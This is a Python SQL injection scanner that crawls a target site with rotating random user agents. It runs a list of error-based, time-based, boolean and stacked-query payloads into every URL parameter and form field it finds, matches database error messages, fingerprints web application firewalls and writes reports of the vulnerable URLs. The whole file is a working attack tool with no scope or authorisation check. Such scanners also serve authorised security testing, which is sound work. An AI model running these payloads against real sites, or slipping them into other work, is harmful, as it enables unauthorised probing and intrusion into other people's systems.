import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from fake_useragent import UserAgent
import re
import argparse
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init as colorama_init
import time
import sys
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet
import pypandoc

# Initialize colorama
colorama_init(autoreset=True)

# Crawler module
visited = set()
user_agent = UserAgent()

def is_internal(url, base):
    return urlparse(url).netloc == urlparse(base).netloc

def extract_links(url, session, max_depth=2, depth=0):
    if depth > max_depth or url in visited:
        return []
    visited.add(url)
    links = []

    try:
        headers = {'User-Agent': user_agent.random}
        response = session.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, "lxml")
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag['href'])
            if is_internal(link, url):
                links.append(link)
                links += extract_links(link, session, max_depth, depth + 1)
    except Exception:
        pass
    return list(set(links))

# SQLi Scanner module
sqli_payloads = [
    # Error-based
    "'", '"', "'--", "'#", "' OR 1=1--", "' OR 'a'='a", "' OR sleep(5)--",
    '" OR 1=1--', "' OR 1=1#", "' OR 1=1 LIMIT 1--",
    # Time-based
    "' OR SLEEP(5)--", '" OR SLEEP(5)--', "' OR pg_sleep(5)--", '" OR pg_sleep(5)--',
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--", '" AND 1=1--', '" AND 1=2--',
    # Stacked queries (may not work everywhere)
    "'; WAITFOR DELAY '0:0:5'--", "'; SELECT pg_sleep(5)--"
]

sql_errors = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax.*mysql",
    "warning.*mssql",
    "syntax error.*oracle",
    "postgresql.*error",
    "unknown column",
    "sql syntax error",
    "sql error",
    "database error",
    "syntax error",
    "mysql_fetch",
    "ora-00933",
    "ora-00921",
    "ora-00936",
    "microsoft.*odbc.*sql",
    "valid mysql result",
    "mysql_connect()",
    "mysql_query()",
    "mysql_num_rows()",
    "supplied argument is not a valid mysql",
    "column count doesn't match value count",
    "incorrect syntax near"
]

def filter_parameterized_urls(urls):
    return [url for url in urls if "?" in url and "=" in url]

def test_get_sqli(url, session):
    from urllib.parse import urlparse, parse_qs, urlencode

    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        query = parse_qs(parsed.query)

        for param in query:
            for payload in sqli_payloads:
                test_params = query.copy()
                test_params[param] = payload
                full_url = f"{base}?{urlencode(test_params, doseq=True)}"
                res = session.get(full_url, timeout=5)
                for err in sql_errors:
                    if re.search(err, res.text, re.IGNORECASE):
                        return full_url
    except Exception:
        return None

    return None

def test_post_sqli(url, session):
    try:
        res = session.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "lxml")
        forms = soup.find_all("form")
        for form in forms:
            action = urljoin(url, form.get("action"))
            method = form.get("method", "get").lower()
            inputs = form.find_all(["input", "textarea", "select"])
            data = {}

            for input_tag in inputs:
                name = input_tag.get("name")
                if not name: continue
                data[name] = "test"

            for payload in sqli_payloads:
                for key in data:
                    test_data = data.copy()
                    test_data[key] = payload
                    if method == "post":
                        r = session.post(action, data=test_data, timeout=5)
                    else:
                        r = session.get(action, params=test_data, timeout=5)
                    for err in sql_errors:
                        if re.search(err, r.text, re.IGNORECASE):
                            return action
    except:
        return None
    return None

# Reporter module
def save_html_report(vulnerable_urls, file="report.html"):
    with open(file, "w") as f:
        f.write("<h1>SQL Injection Scan Report</h1><ul>")
        for url in vulnerable_urls:
            f.write(f"<li>{url}</li>")
        f.write("</ul>")

def save_pdf_report(vulnerable_urls, file="report.pdf"):
    doc = SimpleDocTemplate(file)
    styles = getSampleStyleSheet()
    elements = [Paragraph("SQL Injection Report", styles['Title']), Spacer(1, 12)]
    for url in vulnerable_urls:
        elements.append(Paragraph(url, styles['Normal']))
    doc.build(elements)

def save_docx_report(vulnerable_urls, file="report.docx"):
    try:
        html = "<h1>SQL Injection Scan Report</h1><ul>"
        for url in vulnerable_urls:
            html += f"<li>{url}</li>"
        html += "</ul>"
        pypandoc.convert_text(html, 'docx', format='html', outputfile=file, extra_args=['--standalone'])
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Could not generate DOCX report: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Consider installing pandoc or use HTML/PDF reports{Style.RESET_ALL}")

# WAF Detection
def detect_waf(url, session):
    waf_signatures = [
        ("cloudflare", "cf-ray"),
        ("sucuri", "sucuri/cloudproxy"),
        ("incapsula", "incap_ses"),
        ("akamai", "akamai"),
        ("f5", "bigip"),
        ("mod_security", "mod_security"),
        ("barracuda", "barra_counter_session"),
    ]
    try:
        resp = session.get(url, timeout=5)
        headers = str(resp.headers).lower()
        text = resp.text.lower()
        for name, sig in waf_signatures:
            if sig in headers or sig in text:
                print(f"{Fore.YELLOW}[!] WAF Detected: {name.title()} ({sig}){Style.RESET_ALL}")
                return name
    except Exception:
        pass
    print(f"{Fore.GREEN}[+] No obvious WAF detected.{Style.RESET_ALL}")
    return None

def threaded_scan(urls, func, session, desc, max_workers=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_url = {executor.submit(func, url, session): url for url in urls}
        for future in tqdm(as_completed(future_to_url), total=len(urls), desc=desc):
            url = future_to_url[future]
            try:
                result = future.result()
                if result:
                    results.append(result)
                    print(f"{Fore.RED}[!] {desc}: {result}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error scanning {url}: {e}{Style.RESET_ALL}")
    return results

def main():
    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument("-u", "--url", required=True, help="Base URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Crawl depth (default: 2)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-f", "--format", choices=["html", "pdf", "docx", "all"], default="all", help="Report format")
    args = parser.parse_args()

    session = requests.Session()
    base_url = args.url

    print(f"{Fore.CYAN}[*] Crawling...{Style.RESET_ALL}")
    urls = extract_links(base_url, session, max_depth=args.depth)
    print(f"{Fore.GREEN}[+] Found {len(urls)} URLs{Style.RESET_ALL}")

    param_urls = filter_parameterized_urls(urls)
    print(f"{Fore.CYAN}[*] Found {len(param_urls)} parameterized URLs{Style.RESET_ALL}")

    print(f"{Fore.CYAN}[*] WAF Detection...{Style.RESET_ALL}")
    detect_waf(base_url, session)

    vulnerable = []

    # Multi-threaded GET SQLi scan
    vulnerable += threaded_scan(param_urls, test_get_sqli, session, desc="GET SQLi", max_workers=args.workers)

    # Multi-threaded POST SQLi scan
    vulnerable += threaded_scan(urls, test_post_sqli, session, desc="POST SQLi", max_workers=args.workers)

    # Save Reports
    if args.format in ("html", "all"):
        save_html_report(vulnerable)
    if args.format in ("pdf", "all"):
        save_pdf_report(vulnerable)
    if args.format in ("docx", "all"):
        save_docx_report(vulnerable)

    print(f"{Fore.GREEN}[+] All reports saved.{Style.RESET_ALL}")

# Make sure the main function is called when the script is executed directly
if __name__ == "__main__":
    main()
